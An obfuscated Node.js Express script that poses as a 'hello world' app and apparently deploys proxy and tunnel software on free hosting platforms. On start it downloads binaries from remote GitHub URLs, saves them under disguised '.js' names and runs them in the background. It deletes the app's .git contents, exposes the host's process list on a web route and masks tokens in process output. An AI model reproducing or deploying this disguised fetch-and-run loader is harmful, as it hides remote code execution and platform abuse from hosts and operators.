const port = process.env.SERVER_PORT || process.env.PORT || 3000;
const vmms = process.env.MPATH || 'vms';
const vmmport = process.env.VM_PORT || '8001';
const nezhaser = process.env.NEZHA_SERVER || '';
const nezhaKey = process.env.NEZHA_KEY || '';
const nezport = process.env.NEZHA_PORT || '443';
const neztls = process.env.NEZHA_TLS || '--tls';
const argoKey = process.env.TOK;
const _0x3ec6=['stream','https://github.com/dsadsadsss/1/releases/download/xry/kano-yuan-arm','join','pidof\x20web.js','http://127.0.0.1:','cff.js','type','hello\x20world','https://github.com/dsadsadsss/1/releases/download/xry/kano-yuan','调起ar-go-命令行执行成功!','send','get','chmod\x20+x\x20./nezha.js\x20&&\x20nohup\x20./nezha.js\x20-s\x20','close','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64','ps\x20-ef\x20|\x20sed\x20\x27s@--token.*@--token\x20${TOK}@g;s@-s\x20data.*@-s\x20${NEZHA_SERVER}@g\x27','URL_CF','URL_BOT2','pipe','amd64','下载ar-go文件成功','</pre>','pidof\x20nezha.js','exec','x64','<pre>命令行执行错误：\x0a','env','then','请求主页-命令行执行成功','\x20>/dev/null\x202>&1\x20&','下载web文件成功','catch','arch','调起ar-go-命令行执行错误','Example\x20app\x20listening\x20on\x20port\x20','use','curl\x20-m5\x20','下载nez文件失败','path','调起web-命令行执行错误','https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64','下载ar-go文件失败','log','html','BAOHUO_URL','https://','https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_amd64'];const _0x1e04=function(_0x3ec69b,_0x1e0445){_0x3ec69b=_0x3ec69b-0x0;let _0x35f33e=_0x3ec6[_0x3ec69b];return _0x35f33e;};const express=require('express');const app=express();var exec=require('child_process')[_0x1e04('0x17')];const os=require('os');const {createProxyMiddleware}=require('http-proxy-middleware');const axios=require('axios');const fs=require('fs');const path=require(_0x1e04('0x26'));app[_0x1e04('0xb')]('/',function(_0x4639bd,_0x154629){_0x154629[_0x1e04('0xa')](_0x1e04('0x7'));});app[_0x1e04('0xb')]('/stas',function(_0x190f3e,_0xda44bd){let _0x2987da=_0x1e04('0xf');exec(_0x2987da,function(_0x49d9db,_0x27e13d,_0x45abec){if(_0x49d9db){_0xda44bd[_0x1e04('0x6')](_0x1e04('0x2b'))[_0x1e04('0xa')](_0x1e04('0x19')+_0x49d9db+'</pre>');}else{_0xda44bd['type']('html')['send']('<pre>获取系统进程表：\x0a'+_0x27e13d+_0x1e04('0x15'));}});});app[_0x1e04('0x23')]('/'+vmms,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x46a99b,_0x310a3d,_0x39d9ea){},'pathRewrite':{['^/'+vmms]:'/'+vmms},'target':_0x1e04('0x4')+vmmport+'/','ws':!![]}));function keep_web_alive(){if(process[_0x1e04('0x1a')]['SPACE_HOST']){const _0xc846bc=_0x1e04('0x2d')+process['env']['SPACE_HOST'];exec(_0x1e04('0x24')+_0xc846bc,function(_0x30134f,_0x43a147,_0x1db0b6){if(!_0x30134f)console['log']('请求主页-命令行执行成功'+_0x43a147);});}else if(process['env'][_0x1e04('0x2c')]){const _0x3e388b='https://'+process[_0x1e04('0x1a')]['BAOHUO_URL'];exec('curl\x20-m5\x20'+_0x3e388b,function(_0x522900,_0x18bca1,_0x27904e){if(!_0x522900)console[_0x1e04('0x2a')]('请求主页-命令行执行成功'+_0x18bca1);});}else if(process[_0x1e04('0x1a')]['PROJECT_DOMAIN']){const _0x3be595=_0x1e04('0x2d')+process['env']['PROJECT_DOMAIN']+'.glitch.me';exec(_0x1e04('0x24')+_0x3be595,function(_0x1daf75,_0x32bc3f,_0x53b15d){if(!_0x1daf75)console['log'](_0x1e04('0x1c')+_0x32bc3f);});}exec('rm\x20-rf\x20/app/.git/*');exec(_0x1e04('0x3'),function(_0x58f425,_0x35d7e5,_0xdf835b){if(!_0x35d7e5){exec('chmod\x20+x\x20./web.js\x20&&\x20nohup\x20./web.js\x20>/dev/null\x202>&1\x20&',function(_0x3778b5,_0x2cd694,_0x5e9efb){if(_0x3778b5)console[_0x1e04('0x2a')](_0x1e04('0x27'));else console['log']('调起web-命令行执行成功!');});}});}setInterval(keep_web_alive,0x14*0x3e8);if(nezhaKey){function keep_nezha_alive(){exec(_0x1e04('0x16'),function(_0x1e2d55,_0x120f0c,_0x17958b){if(!_0x120f0c){exec(_0x1e04('0xc')+nezhaser+':'+nezport+'\x20-p\x20'+nezhaKey+'\x20'+neztls+_0x1e04('0x1d'),function(_0x25e20d,_0x59e07e,_0xe87655){if(_0x25e20d)console['log']('调起nezha-命令行执行错误');else console['log']('调起nezha-命令行执行成功!');});}});}setInterval(keep_nezha_alive,0x14*0x3e8);}if(argoKey){function keep_cff_alive(){exec('pidof\x20cff.js',function(_0x41cf6c,_0x3d7585,_0x39160d){if(!_0x3d7585){exec('chmod\x20+x\x20./cff.js\x20&&\x20nohup\x20./cff.js\x20tunnel\x20--edge-ip-version\x20auto\x20run\x20--token\x20'+argoKey+'\x20>/dev/null\x202>&1\x20&',function(_0x2fbf3a,_0x1557db,_0x35ea8e){if(_0x2fbf3a)console[_0x1e04('0x2a')](_0x1e04('0x21'));else console[_0x1e04('0x2a')](_0x1e04('0x9'));});}});}setInterval(keep_cff_alive,0x14*0x3e8);}function download_web(_0x407581){let _0x3dd6a='web.js';let _0x4a5b4a=os[_0x1e04('0x20')]()==='x64'||os[_0x1e04('0x20')]()==='amd64'?process[_0x1e04('0x1a')]['URL_BOT']||_0x1e04('0x8'):process[_0x1e04('0x1a')][_0x1e04('0x11')]||_0x1e04('0x1');let _0x779ab9=fs['createWriteStream'](path['join']('./',_0x3dd6a));axios['get'](_0x4a5b4a,{'responseType':_0x1e04('0x0')})[_0x1e04('0x1b')](_0x4999ae=>{_0x4999ae['data'][_0x1e04('0x12')](_0x779ab9);_0x779ab9['on'](_0x1e04('0xd'),()=>_0x407581(null));})[_0x1e04('0x1f')](_0x2a1a3b=>_0x407581('下载web文件失败'));}download_web(_0x393de2=>{if(_0x393de2)console[_0x1e04('0x2a')](_0x393de2);else console['log'](_0x1e04('0x1e'));});if(nezhaKey){function download_nezhan(_0x791b5c){let _0x1af193='nezha.js';let _0x1552ca=os[_0x1e04('0x20')]()==='x64'||os[_0x1e04('0x20')]()===_0x1e04('0x13')?process['env']['URL_NEZHA']||_0x1e04('0x2e'):process['env']['URL_NEZHA2']||'https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_arm64';let _0x101bf1=fs['createWriteStream'](path[_0x1e04('0x2')]('./',_0x1af193));axios['get'](_0x1552ca,{'responseType':'stream'})['then'](_0x223345=>{_0x223345['data'][_0x1e04('0x12')](_0x101bf1);_0x101bf1['on'](_0x1e04('0xd'),()=>_0x791b5c(null));})['catch'](_0x43c79f=>_0x791b5c(_0x1e04('0x25')));}download_nezhan(_0x22debf=>{if(_0x22debf)console['log'](_0x22debf);else console[_0x1e04('0x2a')]('下载nez文件成功');});}if(argoKey){function download_cff(_0x32e6e1){let _0x142ba6=_0x1e04('0x5');let _0x25b971=os[_0x1e04('0x20')]()===_0x1e04('0x18')||os['arch']()===_0x1e04('0x13')?process['env'][_0x1e04('0x10')]||_0x1e04('0xe'):process[_0x1e04('0x1a')]['URL_CF2']||_0x1e04('0x28');let _0x22a5f9=fs['createWriteStream'](path[_0x1e04('0x2')]('./',_0x142ba6));axios[_0x1e04('0xb')](_0x25b971,{'responseType':'stream'})[_0x1e04('0x1b')](_0x8d0e98=>{_0x8d0e98['data'][_0x1e04('0x12')](_0x22a5f9);_0x22a5f9['on'](_0x1e04('0xd'),()=>_0x32e6e1(null));})['catch'](_0x1b31d3=>_0x32e6e1(_0x1e04('0x29')));}download_cff(_0x207eb3=>{if(_0x207eb3)console['log'](_0x207eb3);else console[_0x1e04('0x2a')](_0x1e04('0x14'));});}app['listen'](port,()=>console[_0x1e04('0x2a')](_0x1e04('0x22')+port+'!'));
